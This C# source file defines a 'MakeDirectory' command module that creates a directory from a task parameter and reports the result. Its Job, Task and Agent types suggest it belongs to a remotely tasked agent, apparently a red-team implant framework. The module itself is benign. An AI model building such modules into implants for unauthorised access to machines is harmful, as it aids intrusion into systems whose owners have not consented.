#define COMMAND_NAME_UPPER

#if DEBUG
#undef MKDIR
#define MKDIR
#endif

#if MKDIR

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using Apollo.Jobs;
using Apollo.Tasks;


namespace Apollo.CommandModules
{
    public class MakeDirectory
    {
        public static void Execute(Job job, Agent agent)
        {
            Task task = job.Task;
            string path = task.parameters;
            if (Directory.Exists(path))
            {
                job.SetError($"Directory \"{path}\" already exists.");
                return;
            }

            try
            {
                Directory.CreateDirectory(path);
                job.SetComplete($"Created directory \"{path}\"");
            }
            catch (Exception e)
            {
                job.SetError($"Error creating directory \"{path}\": {e.Message}");
            }
        }
    }
}
#endif